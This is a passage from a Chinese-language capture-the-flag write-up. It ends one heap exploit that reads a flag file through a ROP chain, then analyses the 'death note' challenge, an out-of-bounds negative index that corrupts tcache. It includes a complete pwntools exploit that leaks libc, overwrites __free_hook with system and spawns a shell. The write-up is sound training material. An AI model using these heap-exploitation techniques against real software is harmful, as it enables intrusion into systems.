        p_rax_r, 0,
        syscall,
        p_rdi_r, 1,
        p_rsi_r, flag_address,
        p_rdx_r, 0x50,
        p_rax_r, 1,
        syscall
    ])
    add(0x60, b"1212")
    add(len(bytes(frame)), bytes(frame))
    delete(1)
    payload = orw
    payload = payload.ljust(0x100, b"\x00")
    payload += b"/home/ctf/flag.txt".ljust(0x20, b"\x00")
    p.sendline(payload)
    p.interactive()
## death note
首先我们看一下程序的逻辑，程序一共提供了四种功能`add,delete,edit,show`。`add`函数中按照用户输入的`size`申请了特定大小的堆块，并且注意这里的堆块大小需要小于`0xFF`。一共可以申请十次，将申请得到的堆块地址写入到了数组中的相应位置，将`size`的值单独保存在了一个数组中。
`delete`函数则是根据用户输入的索引值删除了相应的堆块，并且将数组中相应的位置置为0。而`edit`函数则是根据用户输入的索引值调用了下面的语句
    read(0, (void *)buf_list[index], (unsigned int)size_list[index]);
`show`函数则是输出相应索引值中的内容，整个程序的逻辑看起来好像没什么问题。
这里的漏洞存在的位置很巧妙，存在于`edit`函数中，没有对`index`进行向下的检查导致我们可以输入负数。
    ssize_t edit()
    {
      int index; // [rsp+Ch] [rbp-4h]
      write(1, "Provide note index: ", 0x14uLL);
      index = get_int();
      if ( index > 9 )// 数组越界
        return write(1, "The death note isn't that big unfortunately\n", 0x2CuLL);
      if ( !buf_list[index] )
        return write(1, "Page doesn't even exist!\n", 0x19uLL);
      write(1, "Name: ", 6uLL);
      return read(0, (void *)buf_list[index], (unsigned int)size_list[index]);
    }
那么这里越界怎么利用呢。注意到这里其实所有的堆块的指针都是保存在一个堆块中的，该堆块是在`setvbuf`调用的时候申请的。
    void *sub_9AA()
    {
      void *result; // rax
      setvbuf(stdin, 0LL, 2, 0LL);
      setvbuf(stdout, 0LL, 2, 0LL);
      setvbuf(stderr, 0LL, 2, 0LL);
      result = malloc(0x50uLL);
      buf_list = (__int64)result;
      return result;
    }
也就是当我们申请了堆块之后其堆布局如下
    pwndbg> x/20gx 0x0000555555757000
    0x555555757000: 0x0000000000000000      0x0000000000000251 // tcache_pthread_struct
    0x555555757010: 0x0000000000000000      0x0000000000000000
    0x555555757020: 0x0000000000000000      0x0000000000000000
    0x555555757030: 0x0000000000000000      0x0000000000000000
    0x555555757040: 0x0000000000000000      0x0000000000000000
    0x555555757050: 0x0000000000000000      0x0000000000000000
    0x555555757060: 0x0000000000000000      0x0000000000000000
    0x555555757070: 0x0000000000000000      0x0000000000000000
    0x555555757080: 0x0000000000000000      0x0000000000000000
    0x555555757090: 0x0000000000000000      0x0000000000000000
    pwndbg> x/20gx 0x0000555555757260
    0x555555757260: 0x00005555557572c0      0x0000555555757350// 保存我们申请堆块指针的数组
    0x555555757270: 0x00005555557573e0      0x0000555555757470
    0x555555757280: 0x0000555555757500      0x0000555555757590
    0x555555757290: 0x0000555555757620      0x00005555557576b0
    0x5555557572a0: 0x0000555555757740      0x0000000000000000
    0x5555557572b0: 0x0000000000000000      0x0000000000000091
也就是说我们通过越界可以覆写`tcache_pthread_struct`结构体中的内容，因此这里我们首先释放一个堆块，然后利用越界写覆写其`fd`指针，达到一个`UAF`的效果。覆写`fd`指向`free_hook`，那么申请之后就可以直接覆写`free_hook`了。
覆写过程中还存在一个问题就是`size_list`中对应部分是否存在值，如果是`0`则是无法写入的，由于`size_list`这个数组中内容是保存在`bss`段中的，因此其低地址处一般都会有数值存在，因此这里选择一个合适的堆块大小就行了。
对于`libc`地址的泄漏，由于这里含有`show`函数，也就是我们可以利用堆块释放再申请之后中堆块残留的信息泄漏得到`libc`基地址。
    # encoding=utf-8
    from pwn import *
    file_path = "./death_note"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    p = remote('bin.q21.ctfsecurinets.com', 1337)
    libc = ELF('./libc.so.6')
    def add(size):
        p.sendlineafter("5- Exit\n", "1")
        p.sendlineafter("note size:", str(size))
    def edit(index, content):
        p.sendlineafter("5- Exit\n", "2")
        p.sendlineafter("note index: ", str(index))
        p.sendafter("Name: ", content)
    def delete(index):
        p.sendlineafter("5- Exit\n", "3")
        p.sendlineafter("note index: ", str(index))
    def show(index):
        p.sendlineafter("5- Exit\n", "4")
        p.sendlineafter("note index: ", str(index))
    for i in range(9):
        add(0x88)
    delete(0)
    delete(1)
    add(0x88)
    add(0x88)
    show(0)
    heap_address = u64(p.recvline().strip().ljust(8, b"\x00"))
    for i in range(7):
        delete(i)
    delete(7)
    for i in range(7):
        add(0x88)
    add(0x88)
    edit(7, b"a"*8)
    show(7)
    p.recvuntil("a"*8)
    libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 96 - 0x10 - libc.sym['__malloc_hook']
    log.success("libc address is {}".format(hex(libc.address)))
    log.success("heap address is {}".format(hex(heap_address)))
    for i in range(9):
        delete(i)
    for i in range(3):
        add(0xff)
    delete(0)
    delete(1)
    edit(-0x33, p64(libc.sym['__free_hook']))
    add(0xff)
    add(0xff)
    edit(0, b"/bin/sh\x00")
    edit(1, p64(libc.sym['system']))
    delete(0)
    p.interactive()